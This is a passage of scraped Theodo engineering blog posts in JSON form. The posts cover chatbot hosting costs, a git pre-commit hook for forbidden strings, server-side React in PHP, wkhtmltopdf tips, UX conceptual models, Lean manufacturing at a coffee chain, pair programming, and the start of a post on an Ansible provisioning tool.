to the events incoming from this page\n\nNow for the chatbot to send you automatic messages, you need to start the conversation first (otherwise you\u2019ll get a 403)\n\nIf your page is public, find your page in Messenger and send your first message!\nIf not, go to the Facebook page and start a conversation from there\n\nYour app is now in prod!\nYou can start iterating. Facebook allows you to grant permission to testers to use your app before it is validated and available by anyone.\nBenchmarking MVP options\nPros and cons\nI rated Serverless, EC2 and Heroku based on three criteria:\n\n\n\n\nServerless\nEC2\nHeroku\n\n\n\n\nScalability\n++\n+\n\u2013\n\n\nCustomization and services\n+\n++\n\u2013\n\n\nEase of use\n+\n+\n++\n\n\n\nOn Heroku,\n\nYou need to configure manually the scale of your infrastructure\nYou have less integrations than on AWS\nBut it is more user friendly than AWS EC2\nYou have less new concepts to understand than Serverless\n\nOn the other hand, once you get used to Serverless or EC2s, you can implement your service faster and more easily.\nPricing\nI\u2019ll consider two scenarios:\n\nThe custom IFFT: low traffic and light computing memory\nA data processing job running every hour\n\nRequiring less than 500MB RAM\nRequiring more than 500MB RAM\n\n\n\n\n\n\nServerless\nEC2\nHeroku\n\n\n\n\n1\n0.30\u20ac/month\n3\u20ac/month\nFree for 1 app\n\n\n2.1\n0.67\u20ac/month\n4\u20ac/month\n7\u20ac/month\n\n\n2.2\n1.35\u20ac/month\n8\u20ac/month\n25\u20ac/month\n\n\n\n\nHeroku is still a good plan in case 1\nAWS is a better bargain if:\nYou need a cron job every hour\nYou need lots of computing memory\nServerless is cheaper than EC2\n\nThat\u2019s it for now!\nI\u2019ll be happy to have your opinion or feedback if you tried using Serverless or AWS Lambda, or if you have any question or suggestion about this tutorial.\nFeel free to leave a comment \nSources for the benchmark\n\nAWS Lambda Pricing in Context \u2013 A Comparison to EC2\nAWS Lambda Pricing Calculator and AWS Simple Monthly Calculator\nHeroku Pricing Page\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYu Ling Cheng\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo\r\nhttps://www.linkedin.com/in/yulingcheng  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tToday, for\u00a0the 185th time, I accidentally committed some debugging code on my project. But there won\u2019t be a\u00a0186th time.\nHow\u00a0hard can it be to get a warning when I\u2019m about to commit a diff that contains certain forbidden strings?\nOf course it isn\u2019t \u2013 it\u2019s called pre-commit hooks.\nAnd Github user pimterry came up with a pre-commit hook that does just this and lets you choose whether to abort or to commit nevertheless.\nSetting it up\nTo check for the presence of Mocha\u2019s describe.only and it.only methods on my project, I added these two entries to my Makefile:\ninstall-git-hook:\r\n\tcurl https://cdn.rawgit.com/pimterry/git-confirm/v0.2.1/hook.sh > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit && make configure-git-hook\r\n\r\nconfigure-git-hook:\r\n\tgit config --unset-all hooks.confirm.match || echo 'Nothing to clear'\r\n\tgit config --add hooks.confirm.match 'describe.only'\r\n\tgit config --add hooks.confirm.match 'it.only'\nHow it works\n\ninstall-git-hook tries to download and install\u00a0pimterry\u2019s\u00a0hook on your project.\nconfigure-git-hook sets up 2 forbidden strings: it.only and describe.only. Replace these with the ones you need.\n\nThen, run make install-git-hook in your project directory.\nNow when you commit a file containing a forbidden string, this is what you get:\n\nThe default configuration includes a few usual suspects such as TODO and @ignore.\nViewing or editing your list of forbidden keywords is all a matter of playing with git config. You can refer to the Git Confirm repo\u00a0for details.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFoucauld Degeorges\r\n  \t\t\t\r\n  \t\t\t\tSoftware Architect and Developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHow to improve the speed of a React application?\nReact is an incredible framework. You may have already learnt it from another post. However, it is a client-side framework and as such, it has a few drawbacks:\n\nsearch bots do not see the page content *\na user with disabled javascript cannot see the page\n\nOK, these are not the first things you are worried about when you create a website. The main drawback of such frameworks is the initial page load. According to an Akamai report, 25% of Internet connections are below 4Mbps.\nFor these 25% connections, a typical connection flow for a medium React\napplication (bundle of 1MB) is the following:\n\nIt takes 2 seconds for the user to see your application!\nWhat is an Isomorphic application and why does it speed up my React application?\nAn isomorphic application is an application that shares the same codebase on the server side and on the client side. By sharing the same codebase, it is possible to render a page on the server side and send directly the result to the client. This result in the following flow:\n\nNow the users will fetch the first page twice faster, your website will have a greatly enhanced Search Engine Optimisation (SEO), and people that sadly don\u2019t have javascript will be able to admire your application.\nIf you are not convinced yet by isomorphic applications, you will be in a few lines. As there is only one common codebase, the code is easier to maintain and to test. Finally, you have a common state between the client and the server which makes it easier to debug your application.\nHow does it work?\nUntil now, isomorphic applications consisted in rendering the html code in a headless browser on the server such as PhantomJS. However, React is different from other Single-Page Application (SPA) frameworks thanks to its virtual DOM, an in-memory DOM decreasing the number of costly DOM modifications. With its virtual DOM, React does not need a headless browser to render a page and it is now possible to do it anywhere Javascript can be run. And this can be done on the server side thanks to the v8 engine and the various libraries to bind the engine to a specific language.\nI want to do it, what should I do?\nCreating an Isomorphic React application is actually simple. In order to integrate your React application into a PHP server, you will need to install v8js which embeds the v8 engine in PHP. Here are instructions to install it on Mac, Linux, and Windows.\nThe React team has created react-php-v8js which is dedicated to rendering React components in PHP. Let\u2019s start a new project and use this package:\nmkdir isomorphic-react && cd $_\r\ncomposer require reactjs/react-php-v8js\r\n\nTo create our compiling pipeline, create a package.json file with the\nfollowing:\n{\r\n  \"name\": \"php-and-react\",\r\n  \"version\": \"0.1.0\",\r\n  \"scripts\": {\r\n    \"make\": \"npm run make-dev && npm run make-min && npm run make-table\",\r\n    \"make-dev\": \"browserify -t [ envify --NODE_ENV development ] src/react-bundle.js > build/react-bundle.js\",\r\n    \"make-min\": \"browserify -t [ envify --NODE_ENV production ] src/react-bundle.js | uglifyjs > build/react-bundle.min.js\",\r\n    \"make-table\": \"babel --presets react src/app.js > build/app.js\"\r\n  },\r\n    \"dependencies\": {\r\n    \"babel-cli\": \"^6.3.17\",\r\n    \"babel-preset-react\": \"^6.3.13\",\r\n    \"browserify\": \"^12.0.1\",\r\n    \"envify\": \"^3.4.0\",\r\n    \"react\": \"^0.14.5\",\r\n    \"react-dom\": \"^0.14.5\",\r\n    \"uglifyjs\": \"^2.4.10\"\r\n  }\r\n}\r\n\nThen to install the dependencies, run:\nnpm install\r\n\nIn the src folder, let\u2019s create a react-bundle.js file which will load all the libraries.\n// These dependencies will be compiled by browserify afterwards.\r\nglobal.React = require('react');\r\nglobal.ReactDOM = require('react-dom');\r\nglobal.ReactDOMServer = require('react-dom/server');\r\n\nWe can then create a very simple React component in app.js:\nvar App = React.createClass({\r\n  render() {\r\n    return (\r\n      <p>\r\n        The server time is {this.props.time}.\r\n      </p>\r\n    );\r\n  }\r\n});\r\n\nFinally, let\u2019s build our PHP server.\n<?php\r\n\r\n// Load the dependencies\r\nrequire_once('vendor/autoload.php');\r\n\r\n// Create the ReactJS object\r\n$rjs = new ReactJS(\r\n  // location of React's code\r\n  file_get_contents('build/react-bundle.js'),\r\n  // application code\r\n  file_get_contents('build/app.js')\r\n);\r\n\r\n// Data that will be handed over to the component\r\n$props = [\r\n  \"time\" => date(\"H:i:s\")\r\n];\r\n\r\n// Set the current component to render\r\n$rjs->setComponent('App', $props);\r\n\r\n?>\r\n\r\n<html>\r\n  <head>\r\n    <title>React from PHP</title>\r\n  </head>\r\n  <body>\r\n    <!-- Insert the rendered content here -->\r\n    <div id=\"app\"><?php echo $rjs->getMarkup(); ?></div>\r\n\r\n    <!-- load react and app code -->\r\n    <script src=\"build/react-bundle.min.js\"></script>\r\n    <script src=\"build/app.js\"></script>\r\n\r\n    <!-- client-side render -->\r\n    <script>\r\n      <?php echo $rjs->getJS('#app', \"GLOB\"); ?>\r\n    </script>\r\n  </body>\r\n</html>\r\n\nThe last lines of code, echo $rjs->getJS('#app', \"GLOB\"), loads the scripts and executes a client-side rendering. This way, the initial load uses the fast server-side rendering and the subsequent calls use the (already loaded) framework router.\nRun php -S localhost:5678 and voil\u00e0! A PHP server is now running, rendering the view in the backend.\nCaveats\nServer side rendering is not as simple (for the server) as serving static files. If your server is too slow, the rendering can take more time than serving the files to the client, hence loosing one of the advantage of isomorphic applications. You may want to consider this point before switching your application to isomorphic.\nUseful links\n\nisomorphic-react-with-php is a sample project with everything described here.\nreact-php-v8js is the library used to render pages.\nsymfony-react-sandbox is a project to integrate react application inside symfony applications.\n\n* This is not so much true anymore as Google bots runs the Javascript code and\nAPI calls to fully render the page. This is not a guaranteed result however, nor the case of every spider bot (Facebook, Twitter, Yahoo, Bing, etc).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Escolano\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn the previous article, we saw how to use wkhtmltopdf.\u00a0But, when I did it, I encountered problems that I really want to share with you.\nEach problem has a solution\nFirst, you have to understand what wkhtmltopdf does: rendering the html with \u2018its own browser\u2018. So, when something does not seem to work, try:\n\nTo add an option to wkhtmltopdf\u2019s browser configuration\nModify the html you gave to wkhtmltopdf\u2019s browser\n\nNow, we can improve the rendering of our pdf!\nHow to handle the dimensions of the pdf\n\nFirst, we need to define these two new functions:\n// controller.js\r\n\r\n// Return the width and the height of the document\r\n// In the way the user see it\r\ngetSize = function(html) {\r\n  return {\r\n    width: html.offsetWidth,\r\n    height: html.offsetHeight,\r\n  }\r\n}\r\n\r\n// Return the real full height of the document\r\n// With no scroll\r\ngetRealHeight = function(html) {\r\n  clone = angular.copy(html)\r\n  clone.style.height = 'auto'\r\n  realHeight = clone.offsetHeight\r\n\r\n  return realHeight\r\n}\r\n\nAnd give these two new values to our back-end\n// controller.js\r\n\r\n$scope.print = function() {\r\n  var html = document.getElementsByTagName('html')[0];\r\n  var body = {\r\n    html: html,\r\n    size: getSize(html),\r\n    realHeight: getRealHeight(html),\r\n  };\r\n\r\n  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'})\r\n  .success(function(response) {\r\n    var file = new Blob([ response ], {type: 'application/pdf'});\r\n    FileSaver.saveAs(file, 'print.pdf');\r\n  })\r\n}\r\n\nIn the back-end you just have to set the following options\n\nviewport-size is used to emulate the window size\npage-width and page-height are used to set the pdf size\n\n// pdf.js\r\n  var size = req.body.size\r\n  var realHeight = req.body.realHeight\r\n\r\n  var options = {\r\n    'viewport-size': size.width + 'x' + size.height,\r\n    // I found a 0.271 ratio\r\n    'page-width': (size.width * 0.271),\r\n    'page-height': (realHeight * 0.271),\r\n    'user-style-sheet': CSSLocation,\r\n  }\r\n\nThis way you have exactly what you see on your navigator!\nNota Bene: the page-width and page-height values were given in mm,\u00a0so I thought I should have a 0.264583333 ratio from pixel to mm. But when I tried, I found 0.271 as a better approximation. (This was useful on my project because of SVG with inline dimensions)\n\n\u00a0How to display the images correctly\nYou need to know one thing: wkhtmltopdf needs absolute paths for images.\u00a0In my project, I used this fix:\n// pdf.js\r\n\r\n// Replace relativ path of img by absolute path\r\nhtml = html.replace(/static\\/images\\//g, projectLocation + 'client/www/static/images/')\r\n\nBut you have to change the regex /static\\/images\\//g\u00a0and the path client/www/static/images/ according to where the images are stored.\nHow to modify the pdf before printing it\nIf you understand how wkhtmltopdf works, this hint won\u2019t surprise you: modify the html you send!\n// controller.js\r\n  var body = {\r\n    html: getModifiedHtml(html),\r\n    size: getSize(html),\r\n    realHeight: getRealHeight(html),\r\n  };\r\n\nNow you can do what you want with your pdf:\n// controller.js\r\ngetModifiedHtml = function(html) {\r\n  newHtml = angular.copy(html)\r\n  newHtml = removeHeader(newHtml)\r\n  newHtml = removeFooter(newHtml)\r\n  newHtml = addNewHeader(newHtml)\r\n  newHtml = addNewFooter(newHtml)\r\n  newHtml = doStuff(newHtml)\r\n  // ...\r\n  return newHtml\r\n}\r\n\nBut the first line newHtml = angular.copy(html) is really important.\nDo not forget to start by copying the html you got before modifying it.\nOtherwise, your user will be surprised\u2026\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Langlet\r\n  \t\t\t\r\n  \t\t\t\tVincent Langlet is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tModelling is a widely used tool in Computer Science, but often only thought about from a programming, architecture or requirements gathering perspective. There is a large amount of Human Computer Interaction (HCI) research that shows the importance of modelling the underlying conceptual model of your system from the user\u2019s perspective, ensuring you build a system that exposes to the user a task oriented and intuitive set of concepts the purpose and relationships between which are clear.\nRead on to discover what a conceptual model is, how it is communicated into the mind of the user, the problems that occur when there is a mismatch with the users internalised mental model and the challenges of iterating a conceptual model once in production.\nWhat is a conceptual model?\nA conceptual model defines all the interface concepts users need to understand to use a system. It specifies the concepts, their relationships (e.g. one containing another) and operations that can be executed on them. The conceptual model of a system can be designed before the technology stack, data model or dev team are ready. Designing it involves understanding the task domain and building up a set of concepts that can be used to achieve the desired tasks.\nA good way to express the mental model in a design artifact is to use a basic entity relationship (ER) diagram that maps out the key concepts. A rough sketch of the conceptual model underlying a simple email service helps to illustrate the idea (see below). Lines show the associations and labelled arrows the actions.\n\nWell established in the fields of HCI and UX, but less understood by computer scientists and programmers, the conceptual model should form the focus of any user centered design approach. A good conceptual model is be obvious, intuitive and task oriented. Furthermore it should form the basis of design decisions regarding user interaction. \nUse case analysis is another way to express the underlying conceptual model, but it is easier to iterate a simple ER diagram and also simpler to refer to it when making design decisions.\nInternalisation as a Mental Model\n\nA mental model is the same idea, but from the perspective of the user. A conceptual model is designed by the system designer whereas a mental model is subconsciously internalized by the user through interaction with the platform. The key to a usable system with good UX is to design a system that transfers an accurate representation of the underlying conceptual model into the user\u2019s mind. This can be achieved by using a simple and understandable conceptual model, and using this model in the design of the user interface. \n\nYour conceptual model does not need to be technology based, in fact this will likely be an unintuitive conceptual model. Base it on intuitive and task oriented concepts that are familiar to the user.\n\n\u00a0\nWhen the two mismatch\n\nIt is important that the mental model internalised by the user matches the conceptual model underlying the system as this mental model is used by the user to make assumptions, simulate actions in their head and form task plans to achieve goals with using the system.\nThe classic example of a mismatch between a user\u2019s mental model and the conceptual model of a system is in the operation of a simple home thermostat. The thermostat seems intuitive, turn clockwise for hotter and anti-clockwise for colder. The issue occurs when users come home to a cold house and want it hotter quickly. Many people will turn the thermostat to a higher temperature than desired, thinking that it will heat up quicker. This in fact turns out to be a flawed assumption, resulting from a poor mental model. The user has internalised a mental model similar to that of a cooking hob, where the heat source has an adjustable (on a continuous scale) output, but the heating element of a home central heating system is in fact at a binary system (on or off, 2 discrete values). \n\nIn the above example the consequences are minor, but false assumptions on a banking, e-commerce or messaging platform can have more severe consequences. Even if consequences are mild, a system that does not seem to fulfil a user\u2019s desire will likely be perceived as broken, unintuitive or overly complex.\nPotential challenges in an Agile world\nAny user centered design framework has iterative as one of its core principles. If the conceptual model is the key embodiment of the a system\u2019s design, from a user interaction point of view, then it\u2019s obvious it needs to be iterated.\nEarly stage iteration is great; grab some sharpies and go crazy. Even better is to validate this early draft with target users, and going even further to this create lo-fi wireframes, conduct usability testing with real target users and analyse the results for possible issues with the underlying conceptual model.\nToo many projects view this conceptual modeling as the \u2018ux designer\u2019s\u2019 responsibility, or lack any conscious thought to is at all. Large scale projects can have a great conceptual model developed by an external design firm, but once we start changing the design we need to iterate and keep in mind the conceptual model. \n\n\u00a0\nGood UX is the responsibility of programmers as well as UX consultants.\n\n\u00a0\nIn an\u00a0iterative world we need to be careful about big sweeping changes to our conceptual model after we have real users in production. Of course we can\u2019t stop improving it, but we need to be careful not to make big changes to the conceptual model without just cause. Users have already internalised their mental model, and they will use it to interact with the system. As soon as we change the system\u2019s conceptual model their mental model becomes out of date. You should try to help existing users in this transition period, making extra effort to make the changes and operation of new concepts clear. \nTakeaways\n\n\nStart by designing the conceptual model, \u2018begin by designing what to design\u2019.\nAim to make the conceptual model \u2018obvious, task oriented and simple\u2019\nUse concepts familiar to the target users, and define the target user before this stage. \nDocument your conceptual model (UML is your friend, but keep it dynamic and up to date!)\nBase your design UI/UX decisions on this conceptual model (hence keeping it up to date should be automatic as you use the model while making design decisions).\nIterate this conceptual model based on real user feedback and testing, BUT be careful on the impact on your existing user base.\n\n\n\nEveryone is responsible for good UX, and in today\u2019s world it can make or break a company!\n\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\u00a0How a Spanish Coffee Chain started to go\u00a0Lean\n\n\nThis article wants to be a friendly and concrete introduction to Lean. If you have only heard of the concept, I hope you get a clearer view of what Lean is. If you\u2019re an expert, I hope it provides you with additional facts for you to spread the word about this incredible philosophy. In any case, I left out the most theoretical aspects of Lean to provide a pragmatic case, so there\u2019s plenty more to be learned! And now, lets hop to our tale, shall we?\n\n\n\n\n\n\nPain and\u00a0reaction\nEmi and Juan Antonio Tena, wife and husband, founded 365 in 1999. 365 is a Coffee Chain set in Barcelona. The founders were born in service. In their childhood they waited tables, served coffee, and helped in the kitchen. 365 had 3 caf\u00e9s opened in 2003, 9 in 2005, and in 2009, there were 33 of them. Contrary to what their growth suggests, things didn\u2019t go smoothly. The staff was angry. The quality was poor. They were disorganized. As a result, customer satisfaction was low. 365 is a mix between a caf\u00e9 and a bakery: they sell sandwiches and pastries that you can eat in the shop. Baguettes and pastries are produced in a single bakery, and are then transported to the shops. Since they were still growing in 2009, the founders planned on buying a whole new building to increase their production and storage space. At this point, by chance, Juan Antonio came across the book Lean thinking.\nThe book theorizes Lean manufacturing, which is one of the many efforts of extending what Toyota had been doing successfully since the 1950s. Keep in mind that Toyota\u2019s challenge was to manufacture cars fast in a post-war Japan, where resources were rare and expensive. Yet, Japan became a huge economic power in thirty years, and Toyota became one of the main car manufacturers. Lean, at its core, aims at producing goods one by one, as fast as possible, and with no waste. Imagine the perfect Lean system as a production line where your product is being built without defects by karate masters. Lean is hard to explain because reducing waste is achieved through desperately simple steps. Bear in mind that Lean is hard because it involves change, it involves breaking the \u201cit\u2019s always been done that way\u201d state of mind, and it involved breaking it several times every single day. So how did Emi and Juan Antonio onboard their employees, whose preoccupations were doing their day-to-day work? They started by telling their bakers to go home two hours earlier for three weeks.\n\n\n\n\n\n\nLowering the surface of the sea to see the\u00a0rocks\nFirst, let me reassure you: the bakers were still getting their full wage, even though they were working less. The fridges got empty in three weeks, as the bakers were producing less than what was needed for each day. And that was precisely the goal of this risky maneuver. See, those storage spaces were very costly, and they wasted time. Picture yourself picking frozen baguettes in a very large fridge, trying to find the freshest ones at the back, which you can barely see. You could argue that it\u2019s a matter of organization, yet the bigger the storage, the harder it is to actually visualize what\u2019s in it, and the more you get constrained by how your facility is designed. At first, the bakers thought the founders had gone crazy. Little by little, the fridges\u2019 contents decreased and they eventually got rid of the freezer. The expensive building they considered buying? They did not need it any more. The quality of the bread? Without freezing, it increased dramatically.\nThis is not a fairy tale though. Emi and Juan Antonio did not snap their fingers, made the fridges disappear, and suddenly everyone got happy. Here\u2019s why. A baguette gets significantly less fresh after one day. We have a single bakery, without much storage space for the baguettes. You then have to bring them more often to the shops which means you get more heavily impacted by problems in the production process. And this is where it gets interesting! Remember the situation\u00a0: you are an unhappy worker who has to produce a lot. Suddenly, your stressed boss Juan Antonio tells you that you have to go home earlier every day until the fridges to became empty. When they did, every problem, like a broken oven or overcooked baguettes, could no longer be solved thanks to your stock, and so they hurt more than before. Wouldn\u2019t you have asked for the old system to be brought back? This is where the founders had to be smart.\nLean is a just-in-time manufacturing process, meaning that ideally you would produce baguettes, or cars, one by one. Just-in-time is also a hallmark of Fordism, a system that has been rightfully criticized for the big strain it put on workers. Lean, and Toyota, use just-in-time to show the problems in the manufacturing process, and give the workers the ability to stop the production chain if they spot a problem, and give them tools to solve them. You can see it as lowering the surface of the sea to see the rocks. Emi and Juan Antonio hired Lean coaches to help the bakers solve the day-to-day production issues, they encouraged the employees to take Lean classes, and went to Lean workshops. In other words, if your production chain was a water hose, using just-in-time would be adding pressure to the water travelling inside it to find the holes.\n\n\n\n\n\n\nEmbracing the\u00a0problems\nIt\u2019s impossible to go into the details of the countless specific problems 365 employees solve every day, so I\u2019ll relate one. Leonor \u00ab\u00a0Leo\u00a0\u00bb Tena, daughter of the founders, who also works at 365, kindly told me about it during a video call. Strangely, she kept excusing herself for her Spanish accent when I had no trouble understanding her at all, and I thought my accent was far worse. \u00ab\u00a0In the factory they have different sections. One of them takes the bread from the fermentadora and puts it in the oven. At this step the size was a frequent problem\u00a0\u00bb she explains. As a result, the baguettes coming out of the oven tiny and dry. Why? This was because the fermentation was going wrong. Why? Because the bread had to have a specific size to be put in the fermentation room aka the fermentadora. Eventually one of the bakers got fed up with the defect. \u00ab\u00a0At first the baker used a cardboard that he cut as a guide to check the size of the baguette. The manager said it\u2019s a good idea and they made a metal one. Now it\u2019s even used for other things as the bread\u00a0\u00bb, Leo told me.\nIt does not seem like much, but remember that they solve these kinds of problems every day. If they did not have Lean, they would have maybe went on with the problem, because since they had stock a few baguettes gone wrong did not have a big impact. The manager could also have spotted the problem and engineered a complicated solution. Because the baker was working close to the problem, he was able to find a simple and pragmatic solution. His manager helped him in making it a standardized one. This type of solution is called an andon in Lean, and here it takes the form of a simple quality check.\nEventually, after months of efforts, people felt like Lean really worked. \u00ab\u00a0They were doing les movement, producing the double. The saw the results; it\u2019s easy to see the results: they used less hours to produce the same things. In the end, you agree with the methods\u00a0\u00bb, summed up Leo.\nLean is now applied everywhere in 365, from the providers, to the workshop, the shops, accounting, or human resources. This article has been fueled by a presentation and a visit of 365 during the Barcelona Lean Summit, which I attended with my fellow Theodoers. There is a lot more to write about 365 and Lean, so do feel free to express your interest in another article like this one!\nTo go further:\n\nthis article from Planet Lean is an interesting analysis of 365\na summary of Lean Thinking\nan article on minimizing inventory\n\u201cit\u2019s always been done that way\u201d and the Five Monkeys fable\n\nThis article has been cross-posted to my Medium page.\n\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\nWhat is pair programming?\nPair programming is when two developers work on the same task on a single machine in a specific way: in pair programming (or \u201cpairing\u201d), the two devs must swap between two roles:\n\none at the keyboard, physically writing the code\nthe other not at the keyboard, suggesting ideas and catching errors\n\nThe roles must be swapped on a timer, for example 5 minutes or 3 minutes, which you can set with a phone alarm or an application on the computer.\nThere are many situations in a sprint when pair programming is really useful.\nRead on to find out how and when you can use it!\nAdvantages\nErrors can be caught faster when you have two people looking at the code.\nTwo coders working together in this way will come up with ideas and potential solutions much faster.\nIt\u2019s like instant code review.\nThe experience of the two developers is combined meaning better architectural decisions are taken.\nThe alternating timeboxes mean that a developer can\u2019t get stuck with a problem for long periods with no new ideas.\nNo-one loses focus on the work, and both developers keep contributing.\nDisadvantages\nSince pair programming requires full focus, the two devs should ensure they take regular breaks.\nSo when should you use it?\nConceptually complex tasks\nPair programming can really improve your performance on conceptually complex tickets, because these are the ones where the number of details is so large that a single developer would be significantly slowed down and have a higher probability of making mistakes.\nHaving another developer on hand reduces these problems.\nFor example, when integrating a new payment provider with a backend server and a frontend app, the number of details is immense and could be ameliorated by pairing.\nSpeeding up important tasks (e.g. the sprint goal)\nIn order to prioritise the sprint goal, when the sprint backlog is empty but there are still sprint-goal-related tickets in doing, developers should pair on the sprint goal tickets rather than taking tickets from the product backlog.\nThis brings the full development power of two devs to bear on the most critical work in the sprint.\nThe exception to this is if a single dev is particularly well-placed to do the tickets and would be slowed down by pairing \u2013 in that case, that dev should tackle the sprint goal.\nTraining\nPair programming is extremely useful for onboarding new developers \u2013 whether new to Theodo or new to a team.\nA more experienced developer can pair with a trainee to quickly and effectively share knowledge of the project and general coding skills.\nPairing helps the trainee stay engaged and ensures they write code themselves, instead of leaving the work to the experienced developer.\nWhen pairing for training, it is particularly important to respect the timer.\nA good balance is for the trainee to pair in the morning and tackle tickets on their own in the afternoon.\nHelp\nWhen a developer needs help with a specific issue, they can ask another developer \u2013 for example their coach, the architect on the project or any developer who knows about the issue, or indeed any developer \u2013 to pair with them.\nKnowledge can then be shared fluently.\nEven pairing with a developer with no specific experience in the project can be useful as they may catch errors you have missed, or bring fresh ideas.\nBottlenecks\nWhen there are more developers available than tickets available (e.g. in the case of dependency chains, or blocked tickets), pairing can allow the full power of multiple developers to be focused on the available tickets.\nKnowledge-sharing\nPairing is great for the express purpose of sharing knowledge of a new feature \u2013 a developer working the sole ticket implementing new functionality can ask another developer to pair so that the second developer also learns the additional information that is being introduced to the project.\nThis is important to maintain a cross-functional team, which is necessary for a scrum dev team.\nInterviewing\nPair programming is a revealing way to gain an insight into candidates interviewing for the role of developer.\nWhen you pair with someone, you can assess their knowledge firsthand, see how they react to new knowledge, and experience their style of communication and coding.\nConclusion\nPair programming is a great solution whenever you need to do a complex ticket, speed up an important ticket, train a new dev, help or be helped by another dev on a technical issue, get past a dependency bottleneck in a sprint, share knowledge in the dev team, or conduct a technical interview.\nSince these situations arise in every project, and potentially in every sprint (e.g. the sprint goal will always be an important task worth prioritising), you should pair whenever possible in these situations.\nPairing helps everyone in the team get to know each other, builds team spirit, and makes working together on the same task more engaging!\nIt would be great to hear from you \u2013 post any interesting experiences or use-cases of pair programming in the comments below!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFarhan Mannan\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t[Edit]: I\u2019m writting a book about Ansible, click here if want a free draft.\nWhen you start a new project and you create the Ansible provisioning for it, you will do those tasks:\n\nFind the right role on Ansible Galaxy and check if there is nothing odd inside.\nWrite the role you need to have a final working provisioning\nWrite the configuration files (group_vars, hosts, var files)\nConfigure your Vagrantfile\nTest and debug everything until it works fine\n\nAll of this requires time and Ansible\u2019s knowledge to perform. So I wrote a very opinionated and simple yeoman like tool to automate it. My choices are:\n\nThe tool works only on Mac and Linux\nIt is designed to provision only Ubuntu\u2019s servers\nIt targets only the last Ubuntu LTS (currently xenial)\n\nWith very one\u00a0command line, you get what you want:\n\nWhat is there inside ?\n\nA Vagrantfile to launch and configure your local VM\nAn Ansible playbook to provision the local VM and the prod. It includes:\n\nNginx\nPHP\nComposer\nA database role (Mysql, Postgresql or Mongodb)\nAn Ansible playbook which is easy to evolve to satisfy your project specifications\nThe Capifony configuration to deploy the code\n\n\n\nThe steps are pretty straightforward and explained on the documentation.\nIf you have any question, feel free to ping me on Twitter and/or create an issue on Github. All feedbacks are very welcome =).\nIf you want to 